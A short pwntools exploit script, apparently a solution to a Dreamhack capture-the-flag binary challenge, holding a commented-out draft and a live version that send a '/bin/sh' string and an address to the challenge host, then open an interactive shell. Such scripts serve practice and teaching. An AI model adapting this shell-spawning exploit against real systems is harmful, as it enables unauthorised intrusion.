'''
from pwn import *

payload = b'\x90'*4 + b'\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00' + b'\xac\x0a\x4a\x80'

r = remote('host3.dreamhack.games', 13223)

r.send(payload)
r.send(b'21')

r.interactive()
'''
from pwn import *

p = remote("host3.dreamhack.games", 13223)

payload = b'/bin/sh\x00' + b'\xac\xa0\x04\x08'

p.sendline(payload)
p.sendline(b'21')

p.interactive()